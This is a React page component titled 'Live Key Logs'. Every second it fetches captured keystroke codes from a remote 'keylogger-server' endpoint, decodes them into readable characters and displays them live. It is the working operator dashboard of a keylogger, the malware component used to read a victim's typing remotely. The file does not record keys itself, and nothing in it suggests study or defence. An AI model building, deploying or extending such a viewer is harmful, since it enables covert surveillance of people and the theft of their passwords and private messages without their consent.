import { useEffect, useState } from "react";

export default function Home() {
  const [keys, setKeys] = useState([]);

  // Decode keycode to readable key value
  const decodeKey = (code) => {
    const keyMap = {
      2: "1", 3: "2", 4: "3", 5: "4", 6: "5",
      7: "6", 8: "7", 9: "8", 10: "9", 11: "0",
      16: "q", 17: "w", 18: "e", 19: "r", 20: "t",
      21: "y", 22: "u", 23: "i", 24: "o", 25: "p",
      30: "a", 31: "s", 32: "d", 33: "f", 34: "g",
      35: "h", 36: "j", 37: "k", 38: "l",
      44: "z", 45: "x", 46: "c", 47: "v",
      48: "b", 49: "n", 50: "m", 57: " ",
      28: "Enter", 14: "Backspace", 15: "Tab"
    };

    return keyMap[code] || `[${code}]`;
  };

  useEffect(() => {
    const fetchKeys = async () => {
      try {
        const res = await fetch("https://keylogger-server-harimks-projects.vercel.app/api/data");
        const json = await res.json();
        setKeys(json);
      } catch (err) {
        console.error("Fetch error:", err);
      }
    };

    fetchKeys();
    const interval = setInterval(fetchKeys, 1000);
    return () => clearInterval(interval);
  }, []);

  return (
    <div
      style={{
        backgroundColor: "white",
        color: "#222",
        height: "100vh",
        padding: "2rem",
        fontFamily: "monospace",
        overflowWrap: "break-word",
        fontSize: "1.5rem",
      }}
    >
      <h1 style={{ marginBottom: "1rem" }}>Live Key Logs</h1>
      <div>
        {keys.map((k, i) => decodeKey(k)).join("")}
      </div>
    </div>
  );
}
